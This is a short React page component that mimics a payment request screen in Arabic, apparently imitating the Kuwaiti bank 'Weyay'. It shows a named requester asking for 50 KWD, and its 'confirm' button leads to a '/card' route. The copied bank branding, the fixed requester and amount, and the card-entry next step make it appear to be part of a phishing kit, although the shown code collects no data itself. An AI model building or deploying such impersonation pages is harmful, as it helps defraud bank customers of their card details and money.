
import { useParams, useNavigate } from "react-router-dom";

const PaymentPage = () => {
  const { id } = useParams();
  const navigate = useNavigate();

  const handleConfirm = () => {
    navigate(`/card/${id}`);
  };

  const handleReject = () => {
    navigate('/error');
  };

  return (
    <div className="min-h-screen bg-gradient-to-b from-purple-900 via-purple-800 to-indigo-900 text-white">
      <div className="container mx-auto px-3 sm:px-4 py-4 sm:py-8 max-w-md">
        {/* Header with Bank Logo - Mobile Optimized */}
        <div className="text-center mb-8 sm:mb-16 pt-4 sm:pt-8">
          <div className="text-lg sm:text-2xl font-bold mb-2" style={{ fontFamily: 'Arial' }}>
            ويــاي <span className="text-emerald-400">≡</span>
          </div>
        </div>

        {/* Customer Avatar - Mobile Optimized */}
        <div className="text-center mb-8 sm:mb-12">
          <div className="w-20 sm:w-32 h-20 sm:h-32 bg-gray-600 rounded-full mx-auto mb-3 sm:mb-6 flex items-center justify-center">
            <span className="text-2xl sm:text-4xl font-bold text-white">A</span>
          </div>
          <h2 className="text-lg sm:text-2xl font-semibold mb-2 sm:mb-4">AHMED MOHAMED ABDI</h2>
          <p className="text-gray-300 text-base sm:text-lg mb-4 sm:mb-8">طلب منك</p>
          
          {/* Amount - Mobile Optimized */}
          <div className="text-center mb-8 sm:mb-16">
            <span className="text-4xl sm:text-6xl font-bold">50</span>
            <span className="text-lg sm:text-2xl">.000</span>
            <span className="text-sm sm:text-lg ml-1 sm:ml-2">د.ك</span>
          </div>
        </div>

        {/* Action Buttons - Mobile Optimized */}
        <div className="space-y-3 sm:space-y-4">
          {/* Bill Payment Purpose - Mobile Optimized */}
          <div className="bg-gray-700/50 rounded-xl sm:rounded-2xl p-4 sm:p-6 text-center">
            <div className="text-right mb-2 sm:mb-3">
              <span className="text-sm sm:text-base text-gray-300">الغرض</span>
            </div>
            <div className="text-lg sm:text-xl font-medium">Bill Payment</div>
          </div>

          {/* Reject Button - Mobile Optimized */}
          <button
            onClick={handleReject}
            className="w-full bg-transparent border-2 border-white/30 text-white py-3 sm:py-4 rounded-xl sm:rounded-2xl text-lg sm:text-xl font-medium hover:bg-white/10 transition-colors"
          >
            رفض الطلب
          </button>

          {/* Confirm Button - Mobile Optimized */}
          <button
            onClick={handleConfirm}
            className="w-full bg-emerald-400 text-black py-3 sm:py-4 rounded-xl sm:rounded-2xl text-lg sm:text-xl font-bold hover:bg-emerald-500 transition-colors"
          >
            أكـد
          </button>
        </div>
      </div>
    </div>
  );
};

export default PaymentPage;
